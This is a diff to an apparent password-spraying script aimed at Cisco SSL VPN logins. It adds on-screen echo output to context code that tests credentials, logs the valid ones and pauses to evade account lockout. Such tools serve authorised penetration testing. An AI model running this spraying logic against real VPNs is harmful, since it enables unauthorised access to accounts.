@@ -321,9 +321,13 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
             
             if echo $ciscologin | grep -q "SSL VPN Service" | grep "webvpn_logout" ; then
                 echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
+                #added echo to print to screen
+		        echo "Valid Creds $u"
                 curl -s -b cookies.txt $targetlogout
             else
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
+                #added echo to print to screen
+		        echo "Incorrect $u"
             fi
             rm -f cookies.txt
         done
@@ -337,6 +341,8 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
         done
         rm logs/usernamestoremove.txt
         counter=$(($counter + 1))
+        #added echo to print Attempt Count to screen
+	    echo "Attempt Count: $counter"
         if [ $counter -eq $lockout ] ; then
             counter=0
             sleep $lockoutduration
